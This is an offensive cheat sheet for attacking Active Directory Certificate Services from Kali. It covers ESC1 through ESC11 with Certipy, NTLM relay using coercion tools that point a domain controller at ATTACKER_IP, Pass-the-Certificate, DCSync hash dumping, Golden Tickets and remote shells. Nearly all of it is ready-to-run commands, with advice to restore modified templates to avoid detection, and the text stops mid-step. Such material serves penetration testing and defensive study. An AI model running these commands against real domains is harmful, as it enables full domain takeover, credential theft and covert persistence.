---
title: "AD CS Attacks — From Kali"
description: "Active Directory Certificate Services exploitation from Kali: ESC1-ESC8, Certipy enumeration, certificate request abuse, NTLM relay to CA, and Pass-the-Certificate."
weight: 8
tags: ["active-directory", "adcs", "certificates", "certipy", "esc1", "esc8", "kali", "pki"]
---

## Quick Reference Table

| ESC | Vulnerability | Tool | Requirement |
|-----|---------------|------|-------------|
| ESC1 | SAN in template | certipy req | Enroll permission on template |
| ESC2 | Any Purpose EKU | certipy req | Enroll permission |
| ESC3 | Enrollment Agent | certipy req | Agent cert + second request |
| ESC4 | Template write access | certipy template | GenericWrite on template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | certipy req | Any enroll permission |
| ESC7 | CA Manage Officer | certipy ca | Manage CA / Manage Certificates |
| ESC8 | NTLM relay to /certsrv/ | certipy relay | PetitPotam/coercion |
| ESC9 | No szOID_NTDS_CA_SECURITY_EXT | certipy | UPN mapping abuse |
| ESC11 | Relay to ICPR | certipy relay -ca-pfx | NTLM relay |

---

## AD CS Fundamentals

Active Directory Certificate Services (AD CS) is Microsoft's PKI (Public Key Infrastructure) implementation. It issues X.509 certificates used for authentication, encryption, and signing within a Windows domain.

**Core Components:**

- **Certificate Authority (CA):** Issues, revokes, and manages certificates. Can be Enterprise or Standalone.
- **Registration Authority (RA):** Intermediary that validates requests before forwarding to CA.
- **Certificate Templates:** Active Directory objects that define certificate policies — who can enroll, what EKUs are included, and how subject names are built.
- **Enrollment Endpoints:** HTTP (`/certsrv/`), RPC (MS-ICPR), and DCOM interfaces used to request certificates.

**Why AD CS Matters for Attackers:**

- A valid certificate authenticates via Kerberos (PKINIT) and survives password resets.
- Certificate-based authentication returns a TGT and recoverable NTLM hash.
- Misconfigured templates or CA settings can allow low-privilege users to obtain certificates for any domain account, including Domain Admins.
- Certificates are valid for months or years — they provide long-term persistence.

**Common Attack Surface:**

- Templates with `ENROLLEE_SUPPLIES_SUBJECT` flag — allows attacker-controlled SAN.
- Templates with broad enrollment rights (Domain Users, Authenticated Users).
- CA-level flags like `EDITF_ATTRIBUTESUBJECTALTNAME2`.
- Weak ACLs on templates (GenericWrite, WriteDACL).
- Unauthenticated or HTTP-only enrollment endpoints for relay attacks.
- CA-level permissions that allow managing issued certificates.

---

## Tool: Certipy

Certipy is the primary tool for AD CS enumeration and exploitation from Linux/Kali. It handles enumeration, certificate requests, relay attacks, and authentication.

**Installation:**

```bash
pip3 install certipy-ad
```

```bash
# From source (latest development version)
git clone https://github.com/ly4k/Certipy && cd Certipy && pip3 install .
```

**Verify installation:**

```bash
certipy -h
certipy version
```

**Dependencies (installed automatically with pip):**

- `impacket` — Kerberos, LDAP, SMB
- `ldap3` — LDAP queries
- `cryptography` — cert handling
- `pyopenssl`

---

## Enumeration

Certipy's `find` command queries LDAP for all CA objects, certificate templates, and their ACLs. It correlates permissions with vulnerability conditions and flags ESC numbers directly.

**Basic enumeration with credentials:**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP
```

**Output only vulnerable templates:**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -vulnerable
```

**With NTLM hash (Pass-the-Hash):**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -hashes :NTLM_HASH -dc-ip DC_IP -vulnerable
```

**Output to JSON and text files:**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -output results
# Creates: results.json and results.txt
```

**With Kerberos (ccache):**

```bash
KRB5CCNAME=USERNAME.ccache certipy find -k -no-pass -dc-ip DC_IP
```

**Enumerate without saving output (console only):**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP -stdout
```

**Reading certipy find output — key fields:**

- `[!] Vulnerabilities` — lists ESC numbers affecting this template or CA
- `Permissions.Enrollment Rights` — which principals can request this template
- `Permissions.Object Control Permissions` — which principals have write access to the template object
- `msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT` — attacker can supply arbitrary SAN (key ESC1 condition)
- `msPKI-Enrollment-Flag` — includes `PEND_ALL_REQUESTS` (manager approval required), `INCLUDE_SYMMETRIC_ALGORITHMS`
- `pkiextendedkeyusage` — Extended Key Usages; `Client Authentication` is required for Kerberos auth
- `msPKI-RA-Signature: 0` — no enrollment agent signature required
- `Require Manager Approval: False` — direct issuance without approval

**Parsing output files:**

```bash
# Read text output
cat results.txt

# Query JSON for template names
cat results.json | python3 -c "import json,sys; data=json.load(sys.stdin); [print(t.get('Template Name','')) for t in data.get('Certificate Templates',[])]"
```

**Manual LDAP enumeration (alternative, using ldapsearch):**

```bash
# Enumerate all certificate templates
ldapsearch -H ldap://DC_IP -D 'USERNAME@TARGET_DOMAIN' -w 'PASSWORD' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=TARGET_DOMAIN,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pkiextendedkeyusage \
  nTSecurityDescriptor

# Enumerate CA objects
ldapsearch -H ldap://DC_IP -D 'USERNAME@TARGET_DOMAIN' -w 'PASSWORD' \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=TARGET_DOMAIN,DC=local" \
  "(objectClass=pKIEnrollmentService)" \
  name dNSHostName cACertificate
```

---

## ESC1 — Subject Alternative Name Abuse

**Vulnerability condition:**
1. Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`msPKI-Certificate-Name-Flag` includes `ENROLLEE_SUPPLIES_SUBJECT`)
2. Template has `Client Authentication` EKU (or `Smart Card Logon`, `PKINIT Client Authentication`, `Any Purpose`)
3. Template requires no manager approval (`msPKI-Enrollment-Flag` does not include `PEND_ALL_REQUESTS`)
4. Low-privilege user has enroll rights (e.g., Domain Users, Authenticated Users)

**Impact:** Low-privilege user requests a certificate with `Administrator@TARGET_DOMAIN` as the Subject Alternative Name. The CA issues a valid certificate authenticating as Domain Admin.

**Step 1: Request certificate as Administrator (supplying SAN UPN):**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**With NTLM hash:**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -hashes :NTLM_HASH \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**With Kerberos:**

```bash
KRB5CCNAME=USERNAME.ccache certipy req -k -no-pass \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**Target a different user (e.g., service account with DCSync):**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -upn svc_account@TARGET_DOMAIN \
  -dc-ip DC_IP
```

Output: `administrator.pfx` (or named after the UPN target)

**Step 2: Authenticate with the certificate — get TGT and NTLM hash:**

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

Output:
- `administrator.ccache` — Kerberos TGT
- NTLM hash printed to stdout

**Step 3a: Use TGT for impacket tools:**

```bash
export KRB5CCNAME=administrator.ccache

# Dump all hashes from DC
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME

# Get shell
psexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
wmiexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
smbexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

**Step 3b: Use NTLM hash:**

```bash
# DCSync with hash
secretsdump.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@DC_IP

# Remote shell with hash
psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@DC_IP
wmiexec.py -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@DC_IP
```

> **Note:** `certipy auth` uses PKINIT — Kerberos pre-authentication with a certificate. If PKINIT is unavailable or the DC does not support it, use the `-ldap-shell` flag for an LDAP shell via Schannel TLS client authentication instead.

**LDAP shell fallback (when PKINIT fails):**

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP -ldap-shell
# Opens interactive LDAP shell — use: set_rbcd, add_user_to_group, etc.
```

---

## ESC2 — Any Purpose / SubCA EKU

**Vulnerability condition:**
1. Template has `Any Purpose` EKU (OID `2.5.29.37.0`) OR no EKU at all (empty EKU = acts as SubCA)
2. Low-privilege enroll rights on template

**Impact:** Certificate with Any Purpose EKU can be used for client authentication even though the template was not explicitly designed for it. Can also be used as an enrollment agent for ESC3.

**Request the certificate:**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -dc-ip DC_IP
```

**Authenticate directly (if Client Authentication is implied):**

```bash
certipy auth -pfx username.pfx -dc-ip DC_IP
```

**Use as enrollment agent for ESC3 follow-up:**

```bash
# The resulting PFX can be used in the -pfx flag of a second certipy req
# targeting a template that allows enrollment agent requests
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template USER_TEMPLATE \
  -on-behalf-of TARGET_DOMAIN\\Administrator \
  -pfx username.pfx \
  -dc-ip DC_IP
```

---

## ESC3 — Enrollment Agent Abuse

**Vulnerability condition:**
- **Template 1:** Has `Certificate Request Agent` EKU (OID `1.3.6.1.4.1.311.20.2.1`) — enrollment agent template
- **Template 2:** Allows enrollment agents to enroll on behalf of other users (`msPKI-RA-Signature >= 1` or Application Policy includes Certificate Request Agent)

**Impact:** Attacker first obtains an enrollment agent certificate, then uses it to request certificates on behalf of any domain user, including Domain Admin.

**Step 1: Obtain enrollment agent certificate:**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template ENROLLMENT_AGENT_TEMPLATE \
  -dc-ip DC_IP
# Output: username.pfx (enrollment agent certificate)
```

**Step 2: Request certificate on behalf of Administrator:**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template USER_TEMPLATE \
  -on-behalf-of 'TARGET_DOMAIN\Administrator' \
  -pfx username.pfx \
  -dc-ip DC_IP
# Output: administrator.pfx
```

**Step 3: Authenticate:**

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

---

## ESC4 — Template Write Permissions

**Vulnerability condition:**
You have one of the following ACLs on a certificate template object in Active Directory:
- `GenericAll`
- `GenericWrite`
- `WriteOwner` (take ownership, then grant yourself write)
- `WriteDACL` (modify the template's DACL)

**Impact:** Attacker modifies the template to introduce ESC1 conditions (adds `ENROLLEE_SUPPLIES_SUBJECT` flag, removes manager approval, adds Client Authentication EKU), exploits it, then restores the original config.

**Step 1: Modify the template (certipy adds ESC1 conditions and saves original):**

```bash
certipy template -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -template TEMPLATE_NAME \
  -save-old \
  -dc-ip DC_IP
# Saves original config to: TEMPLATE_NAME.json
# Modifies template to be ESC1-exploitable
```

**Step 2: Request certificate as Administrator (ESC1 exploit on now-modified template):**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
# Output: administrator.pfx
```

**Step 3: Restore original template to avoid detection:**

```bash
certipy template -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -template TEMPLATE_NAME \
  -configuration TEMPLATE_NAME.json \
  -dc-ip DC_IP
```

**Step 4: Authenticate:**

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

> **Note:** `-save-old` saves the original template configuration as a JSON file named `TEMPLATE_NAME.json`. Always restore the template after exploitation to reduce detection surface and avoid breaking legitimate certificate issuance.

**WriteOwner path (take ownership first):**

```bash
# If you only have WriteOwner, use owneredit.py to take ownership
owneredit.py -action write -new-owner 'USERNAME' -target 'TEMPLATE_NAME' \
  -dc-ip DC_IP TARGET_DOMAIN/USERNAME:'PASSWORD'

# Then grant yourself GenericWrite using dacledit.py
dacledit.py -action write -rights GenericWrite -principal 'USERNAME' \
  -target 'TEMPLATE_NAME' \
  -dc-ip DC_IP TARGET_DOMAIN/USERNAME:'PASSWORD'

# Then proceed with certipy template
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA

**Vulnerability condition:**
The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set in its configuration. This flag instructs the CA to honor the `SAN:` attribute in certificate requests for ANY template, even those without `ENROLLEE_SUPPLIES_SUBJECT`.

**Impact:** Any template with `Client Authentication` EKU effectively becomes ESC1-exploitable. Every enrolled user can specify an arbitrary UPN in their request.

**Certipy detection:**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP
# Look for in CA section:
# [!] Vulnerabilities
#   ESC6: ...
#   "EDITF_ATTRIBUTESUBJECTALTNAME2 is set"
```

**Exploit: request the default User template with SAN override:**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template User \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**Any other template with Client Authentication EKU also works:**

```bash
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template Machine \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**Authenticate:**

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

> **Note:** Setting `EDITF_ATTRIBUTESUBJECTALTNAME2` is a CA-level configuration change. It affects all templates globally and is a severe misconfiguration. Detection: check CA properties via `certutil -config CA_HOSTNAME\CA_NAME -getreg policy\EditFlags` on Windows, or via certipy's find output.

---

## ESC7 — CA Permissions Abuse (Manage CA / Manage Certificates)

**Vulnerability condition:**
You have `ManageCA` or `ManageCertificates` rights on the CA object itself (not a template). These are CA-level ACLs defined in the CA's security descriptor.

- `ManageCA` (CA Administrator) — can change CA configuration, enable templates, add officers
- `ManageCertificates` (CA Officer) — can issue or deny pending certificate requests

**Detection via certipy find:**

```bash
certipy find -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' -dc-ip DC_IP
# In CA section, look for:
# Permissions:
#   Access Rights:
#     ManageCA: USERNAME or TARGET_DOMAIN\groupname
#     ManageCertificates: USERNAME or TARGET_DOMAIN\groupname
```

**Path 1: ManageCA — add yourself as officer (grants ManageCertificates):**

```bash
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -add-officer USERNAME \
  -dc-ip DC_IP
```

**Path 2: ManageCA — enable the SubCA template (disabled by default):**

```bash
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -enable-template SubCA \
  -dc-ip DC_IP
```

**Path 3: ManageCA — enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (then ESC6):**

```bash
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -enable-editf-attributesubjectaltname2 \
  -dc-ip DC_IP
```

**Full ESC7 chain (ManageCA + ManageCertificates):**

```bash
# Step 1: Add yourself as officer using ManageCA
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -add-officer USERNAME \
  -dc-ip DC_IP

# Step 2: Enable the SubCA template
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -enable-template SubCA \
  -dc-ip DC_IP

# Step 3: Request a SubCA certificate (will be denied — that's expected)
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -template SubCA \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
# Note the Request ID printed in output (e.g., "Request ID is 42")

# Step 4: Issue the denied request using ManageCertificates
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -issue-request REQUEST_ID \
  -dc-ip DC_IP

# Step 5: Retrieve the now-issued certificate
certipy req -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -retrieve REQUEST_ID \
  -dc-ip DC_IP
# Output: administrator.pfx

# Step 6: Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

**List enabled templates on CA:**

```bash
certipy ca -u USERNAME@TARGET_DOMAIN -p 'PASSWORD' \
  -ca CA_NAME \
  -list-templates \
  -dc-ip DC_IP
```

---

## ESC8 — NTLM Relay to AD CS HTTP Enrollment Endpoint

**Vulnerability condition:**
1. CA has web enrollment enabled (`Certificate Authority Web Enrollment` role installed)
2. Web enrollment runs over HTTP (not HTTPS) OR HTTPS without Extended Protection for Authentication (EPA)
3. Attacker can coerce NTLM authentication from the DC or another privileged machine

**Impact:** Relay the DC's machine account NTLM authentication to the CA's `/certsrv/` endpoint. Obtain a certificate for the DC machine account. Use it to DCSync without touching LSASS.

**Step 1: Start certipy relay listener:**

```bash
# Terminal 1: relay listener
certipy relay -target http://CA_HOSTNAME/certsrv/ -template DomainController
```

**Alternative: ntlmrelayx.py with ADCS support:**

```bash
# Terminal 1: relay listener
ntlmrelayx.py \
  -t http://CA_HOSTNAME/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

**Step 2: Coerce DC authentication (Terminal 2):**

```bash
# PetitPotam with credentials (authenticated coercion)
python3 PetitPotam.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  ATTACKER_IP DC_IP
```

```bash
# PetitPotam without credentials (unauthenticated — patched in newer Windows)
python3 PetitPotam.py ATTACKER_IP DC_IP
```

```bash
# PrinterBug (SpoolSample) — alternative coercion method
python3 printerbug.py TARGET_DOMAIN/USERNAME:'PASSWORD'@DC_IP ATTACKER_IP
```

```bash
# Coercer — multi-method coercion tool
coercer coerce -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN \
  -l ATTACKER_IP \
  -t DC_IP
```

**Output from certipy relay (or ntlmrelayx):**

```
[*] Requesting certificate for DC_HOSTNAME$ ...
[*] Saved certificate and key to DC_HOSTNAME$.pfx
```

**Step 3: Authenticate as DC machine account:**

```bash
certipy auth -pfx 'dc_hostname$.pfx' -dc-ip DC_IP
# Prints DC machine account NTLM hash
# Saves: dc_hostname$.ccache
```

**Step 4: DCSync using DC machine account:**

```bash
# With NTLM hash
secretsdump.py -hashes :DC_MACHINE_NTLM_HASH \
  'TARGET_DOMAIN/DC_HOSTNAME$'@DC_IP

# With TGT
export KRB5CCNAME='dc_hostname$.ccache'
secretsdump.py -k -no-pass TARGET_DOMAIN/'DC_HOSTNAME$'@DC_HOSTNAME
```

**Step 5: Use dumped krbtgt hash for Golden Ticket:**

```bash
ticketer.py -nthash KRBTGT_NTLM_HASH \
  -domain-sid DOMAIN_SID \
  -domain TARGET_DOMAIN \
  Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

> **Note:** ESC8 is one of the most impactful AD CS attack paths. It allows full domain compromise by relaying the DC machine account's authentication to the CA — no LSASS access, no Mimikatz, no DCSync permissions needed from a user account. Mitigation: enable HTTPS with EPA on the web enrollment endpoint, or disable web enrollment if unused.

**Check if web enrollment is enabled (from Kali):**

```bash
curl -s -o /dev/null -w "%{http_code}" http://CA_HOSTNAME/certsrv/
# 200 or 401 = web enrollment present
# Connection refused = not enabled
```

```bash
# Check with credentials
curl -s -u 'TARGET_DOMAIN\USERNAME:PASSWORD' http://CA_HOSTNAME/certsrv/
```

---

## ESC9 — No Security Extension (szOID_NTDS_CA_SECURITY_EXT)

**Vulnerability condition:**
1. Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag set (in `msPKI-Certificate-Name-Flag`)
2. Attacker has `GenericWrite` or equivalent on a target user account
3. CA does not enforce the `szOID_NTDS_CA_SECURITY_EXT` security extension (older CAs)

**Impact:** Without the security extension, certificate-to-account mapping in Active Directory relies solely on the UPN. By temporarily changing a target user's UPN to `Administrator@TARGET_DOMAIN`, the attacker requests a certificate bound to that UPN, then restores the original UPN. The certificate authenticates as Administrator.

**Step 1: Set target user's UPN to Administrator's UPN:**

```bash
certipy account update \
  -u USERNAME@TARGET_DOMAIN \
  -p 'PASSWORD' \
  -user TARGET_USER \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**Step 2: Request certificate as target user (certificate will contain Administrator UPN):**

```bash
certipy req \
  -u TARGET_USER@TARGET_DOMAIN \
  -p 'TARGET_PASSWORD' \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -dc-ip DC_IP
# Output: target_user.pfx (contains UPN: Administrator@TARGET_DOMAIN)
```

**Step 3: Restore target user's original UPN:**

```bash
certipy account update \
  -u USERNAME@TARGET_DOMAIN \
  -p 'PASSWORD' \
  -user TARGET_USER \
  -upn TARGET_USER@TARGET_DOMAIN \
  -dc-ip DC_IP
```

**Step 4: Authenticate as Administrator using the certificate:**

```bash
certipy auth -pfx target_user.pfx -domain TARGET_DOMAIN -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

> **Note:** Step 3 (restoring the UPN) is critical. Do it before authenticating. The certificate was already issued with the Administrator UPN embedded — the subsequent UPN change does not invalidate the cert.

---

## ESC11 — Relay to ICPR (MS-ICPR RPC Interface)

**Vulnerability condition:**
1. CA does not require signing on its RPC-based enrollment interface (MS-ICPR)
2. Attacker can coerce NTLM authentication from DC or privileged machine
3. Similar to ESC8 but targets the RPC interface rather than HTTP

**Impact:** NTLM relay to the RPC certificate enrollment interface — obtains a DC machine account certificate enabling DCSync.

**Step 1: Start certipy relay targeting RPC:**

```bash
# Terminal 1: relay to RPC interface
certipy relay \
  -target rpc://CA_HOSTNAME \
  -ca CA_NAME \
  -template DomainController
```

**Step 2: Coerce DC authentication:**

```bash
# Terminal 2: PetitPotam coercion
python3 PetitPotam.py \
  -u USERNAME \
  -p 'PASSWORD' \
  -d TARGET_DOMAIN \
  ATTACKER_IP DC_IP
```

```bash
# Or use Coercer for multiple coercion methods
coercer coerce \
  -u USERNAME \
  -p 'PASSWORD' \
  -d TARGET_DOMAIN \
  -l ATTACKER_IP \
  -t DC_IP
```

**Step 3: Authenticate and DCSync:**

```bash
certipy auth -pfx 'dc_hostname$.pfx' -dc-ip DC_IP
secretsdump.py -hashes :DC_MACHINE_NTLM_HASH 'TARGET_DOMAIN/DC_HOSTNAME$'@DC_IP
```

---

## Pass-the-Certificate (PFX to TGT)

Once you have a `.pfx` certificate file for any domain account, use it to authenticate via PKINIT and obtain a Kerberos TGT and NTLM hash.

**Basic authentication:**

```bash
certipy auth -pfx target.pfx -dc-ip DC_IP
```

**Specify domain explicitly (useful when domain cannot be resolved from cert):**

```bash
certipy auth -pfx target.pfx -domain TARGET_DOMAIN -dc-ip DC_IP
```

**With password-protected PFX:**

```bash
certipy auth -pfx target.pfx -password CERT_PASS -dc-ip DC_IP
```

**Specify username (override what's in the cert):**

```bash
certipy auth -pfx target.pfx -username Administrator -domain TARGET_DOMAIN -dc-ip DC_IP
```

**Using the resulting ccache:**

```bash
export KRB5CCNAME=administrator.ccache

# Verify ticket
klist

# Remote shell
psexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
wmiexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
smbexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
atexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME whoami

# Dump credentials
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME

# Enumerate with BloodHound
bloodhound-python -k -no-pass \
  -d TARGET_DOMAIN \
  -dc DC_HOSTNAME \
  -c all
```

**Convert PFX to PEM/KEY for other tools:**

```bash
# Extract certificate (PEM)
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt -nodes

# Extract private key (PEM)
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key -nodes

# Use with curl for LDAPS Schannel auth
curl --cert administrator.crt --key administrator.key \
  "ldaps://DC_IP/DC=TARGET_DOMAIN,DC=local?samAccountName?sub?(objectClass=user)"
```

**Pass-the-Certificate with gettgtpkinit.py (PKINITtools):**

```bash
# Install PKINITtools
git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools && pip3 install .

# Get TGT using certificate
python3 gettgtpkinit.py \
  -cert-pfx administrator.pfx \
  TARGET_DOMAIN/Administrator \
  administrator.ccache

export KRB5CCNAME=administrator.ccache

# Get NTLM hash from TGT (requires TGT from PKINIT)
python3 getnthash.py \
  -key AS_REP_KEY \
  TARGET_DOMAIN/Administrator
```

---

## Certipy Cheatsheet — Common Flags

| Flag | Purpose |
|------|---------|
| `-u USER@DOMAIN` | Username with domain |
| `-p PASSWORD` | Plaintext password |
| `-hashes :NTLM` | Pass-the-hash (LM:NT or :NT) |
| `-k -no-pass` | Kerberos auth using KRB5CCNAME |
| `-dc-ip DC_IP` | Domain Controller IP address |
| `-ca CA_NAME` | CA name (from certipy find output) |
| `-template TEMPLATE` | Certificate template name |
| `-upn UPN` | Subject Alternative Name UPN for ESC1 |
| `-dns HOSTNAME` | Subject Alternative Name DNS for machine certs |
| `-pfx file.pfx` | Existing PFX cert (for auth or enrollment agent) |
| `-save-old` | Save original template config to JSON (ESC4) |
| `-configuration FILE` | Restore template from JSON (ESC4) |
| `-vulnerable` | Show only vulnerable templates/CAs in find |
| `-output PREFIX` | Output file prefix for find results |
| `-stdout` | Print find results to stdout only |
| `-on-behalf-of DOMAIN\\USER` | Enrollment agent request (ESC3) |
| `-retrieve REQUEST_ID` | Retrieve issued certificate by request ID |
| `-issue-request REQUEST_ID` | Issue pending/denied request (ESC7) |
| `-add-officer USER` | Add user as CA officer (ESC7 ManageCA) |
| `-enable-template TEMPLATE` | Enable template on CA (ESC7 ManageCA) |
| `-ldap-shell` | LDAP shell via Schannel (when PKINIT unavailable) |
| `-debug` | Verbose debug output |
| `-timeout SECONDS` | Request timeout (default: 5) |

---

## Coercion Methods Summary

ESC8 and ESC11 require coercing NTLM authentication from a privileged machine. These are the main tools used from Kali:

**PetitPotam (MS-EFSR):**

```bash
# Install
git clone https://github.com/topotam/PetitPotam

# Authenticated (more reliable, patched for unauthenticated in newer Windows)
python3 PetitPotam.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  ATTACKER_IP DC_IP

# Unauthenticated
python3 PetitPotam.py ATTACKER_IP DC_IP
```

**PrinterBug / SpoolSample (MS-RPRN):**

```bash
# Install impacket-based printerbug
pip3 install impacket

# Coerce via print spooler
python3 printerbug.py 'TARGET_DOMAIN/USERNAME:PASSWORD'@DC_IP ATTACKER_IP
```

**Coercer (multi-protocol):**

```bash
pip3 install coercer

# Scan for available coercion methods
coercer scan -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN -t DC_IP

# Coerce authentication
coercer coerce \
  -u USERNAME \
  -p 'PASSWORD' \
  -d TARGET_DOMAIN \
  -l ATTACKER_IP \
  -t DC_IP
```

**DFSCoerce (MS-DFSNM):**

```bash
git clone https://github.com/compass-security/DFSCoerce
python3 dfscoerce.py -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN ATTACKER_IP DC_IP
```

---

## Full Attack Chain: ESC1 to Domain Admin

A complete, step-by-step chain from low-privilege domain user to Domain Admin via ESC1.

**Prerequisites:**
- Valid low-privilege domain credentials
- Network access to DC (port 389/LDAP, 88/Kerberos) and CA (port 443 or 80 for enrollment)
- Certipy installed

```bash
# Step 1: Enumerate — find vulnerable templates
certipy find \
  -u USERNAME@TARGET_DOMAIN \
  -p 'PASSWORD' \
  -dc-ip DC_IP \
  -vulnerable

# Look for ESC1 in output:
# [!] Vulnerabilities
#   ESC1: ...
# Template Name: TEMPLATE_NAME
# CA Name: CA_NAME
# Enrollment Rights: Domain Users (or similar low-priv group)
```

```bash
# Step 2: Request certificate for Administrator
certipy req \
  -u USERNAME@TARGET_DOMAIN \
  -p 'PASSWORD' \
  -ca CA_NAME \
  -template TEMPLATE_NAME \
  -upn Administrator@TARGET_DOMAIN \
  -dc-ip DC_IP
# Output: administrator.pfx
```

```bash
# Step 3: Authenticate — get TGT and NTLM hash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Output:
# [*] Got hash for 'administrator@TARGET_DOMAIN': aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
# [*] Saved credential cache to 'administrator.ccache'
```

```bash
# Step 4: DCSync to dump all hashes
secretsdump.py \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/Administrator@DC_IP

# Or with TGT
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME
```

```bash
# Step 5 (optional): Pass-the-Hash for interactive shell
